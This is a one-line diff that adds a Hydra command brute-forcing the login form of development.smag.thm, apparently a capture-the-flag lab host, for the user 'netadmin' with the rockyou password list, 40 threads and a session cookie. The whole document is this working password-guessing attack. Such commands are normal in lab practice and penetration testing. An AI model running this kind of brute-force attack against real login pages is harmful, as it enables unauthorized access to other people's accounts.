@@ -1,0 +1,1 @@
+hydra -l netadmin -P /usr/share/wordlists/rockyou.txt development.smag.thm http-post-form "/login.php:username=^USER^&password=^PASS^&login=:F=invalid:H=Cookie: PHPSESSID=r59tlvjikgabe8ob4i4lipnd87; security=low" -t 40 -I -f
